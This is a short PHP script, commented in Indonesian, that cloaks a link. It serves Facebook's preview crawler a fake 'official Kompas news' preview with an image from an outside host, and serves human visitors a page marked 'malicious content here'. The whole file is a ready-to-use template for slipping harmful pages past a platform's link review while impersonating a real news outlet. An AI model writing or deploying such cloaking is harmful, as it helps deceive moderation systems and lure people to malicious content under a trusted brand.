<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'facebookexternalhit') !== false) {
?>
<!-- Bagian untuk Bot Facebook -->
<html>
<head>
  <meta property="og:title" content="Berita Resmi Kompas" />
  <meta property="og:image" content="https://raw.viqey.site/aaa.jpg" />
</head>
<body>Halaman normal</body>
</html>

<?php } else { ?>

<!-- Bagian untuk Manusia -->
<html>
<head>
  <title>Halaman Asli</title>
</head>
<body>Konten jahat disini</body>
</html>

<?php } ?>